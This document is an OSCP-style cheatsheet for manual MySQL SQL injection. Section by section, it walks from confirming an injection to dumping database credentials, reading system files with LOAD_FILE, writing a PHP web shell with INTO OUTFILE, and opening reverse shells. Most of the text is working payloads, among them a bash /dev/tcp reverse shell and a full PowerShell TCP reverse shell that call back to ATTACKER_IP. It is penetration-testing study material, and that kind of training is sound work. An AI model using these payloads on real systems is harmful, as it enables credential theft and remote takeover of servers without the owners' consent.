# MySQL SQL Injection Cheatsheet (OSCP)

## Scope & Goal
- Database: MySQL / MariaDB
- Path: Web App → SQLi → Data Dump → File Write → Shell
- Manual exploitation first, sqlmap as backup
- Targets: Linux and Windows (XAMPP/IIS)

---

## 1. Confirm SQL Injection (MySQL)

### Numeric context
```
?id=1 AND 1=1
?id=1 AND 1=2
```

### String context
```
?id=1'
?id=1' AND '1'='1
?id=1' AND '1'='2
```

### MySQL comments
```
-- -
#
/**/
```

### Time-based confirmation
```
?id=1 AND SLEEP(5)
?id=1' AND SLEEP(5)-- -
```

---

## 2. Identify Injection Context
```
'
')--
"))--
```

If this works:
```
?id=1'--
```

---

## 3. Find Column Count
```
?id=1 ORDER BY 1-- -
?id=1 ORDER BY 2-- -
?id=1 ORDER BY 3-- -
```

---

## 4. UNION SELECT Baseline
```
?id=-1 UNION SELECT NULL,NULL,NULL-- -
```

Fallback:
```
?id=-1 UNION SELECT 1,2,3-- -
```

---

## 5. Identify Reflected Columns
```
?id=-1 UNION SELECT 'AAA','BBB','CCC'-- -
```

---

## 6. Fingerprint MySQL
```
?id=-1 UNION SELECT @@version,user(),database()-- -
```

---

## 7. Enumerate Databases
```
?id=-1 UNION SELECT schema_name,NULL,NULL
FROM information_schema.schemata-- -
```

---

## 8. Enumerate Tables
```
?id=-1 UNION SELECT table_name,NULL,NULL
FROM information_schema.tables
WHERE table_schema='appdb'-- -
```

---

## 9. Enumerate Columns
```
?id=-1 UNION SELECT column_name,NULL,NULL
FROM information_schema.columns
WHERE table_name='users'
AND table_schema='appdb'-- -
```

---

## 10. Dump Credentials
```
?id=-1 UNION SELECT username,password,NULL
FROM users-- -
```

---

## 11. Check File Write Capability
```
?id=-1 UNION SELECT @@secure_file_priv,NULL,NULL-- -
```

---

## 12. Read Files with LOAD_FILE

### Linux
```
LOAD_FILE('/etc/passwd')
LOAD_FILE('/var/www/html/index.php')
```

### Windows
```
LOAD_FILE('C:/xampp/htdocs/index.php')
LOAD_FILE('C:/Users/Administrator/Desktop/user.txt')
```

---

## 13. Common Web Roots

### Linux
```
/var/www/html/
/usr/share/nginx/html/
/opt/lampp/htdocs/
```

### Windows
```
C:/xampp/htdocs/
C:/wamp/www/
C:/inetpub/wwwroot/
```

---

## 14. Write PHP Web Shell
```
?id=-1 UNION SELECT
'<?php system($_GET["cmd"]); ?>',
NULL,
NULL
INTO OUTFILE '/var/www/html/shell.php'-- -
```

Windows:
```
INTO OUTFILE 'C:/xampp/htdocs/shell.php'
```

---

## 15. Linux Reverse Shell
```
<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

---

## 16. Windows PowerShell Reverse Shell
```
powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

---

## 17. Blind SQLi

### Boolean
```
?id=1 AND SUBSTRING(database(),1,1)='a'
```

### Time
```
?id=1 AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)
```

---

## 18. sqlmap (Backup)
```
sqlmap -r req.txt -p id --dbms=mysql --batch
```

---

## 19. OSCP Checklist
- [ ] Confirm SQLi
- [ ] Identify context
- [ ] Find column count
- [ ] UNION SELECT
- [ ] Enumerate DBs
- [ ] Enumerate tables
- [ ] Dump creds
- [ ] Check file write
- [ ] Write shell
- [ ] Reverse shell
- [ ] Privilege escalation
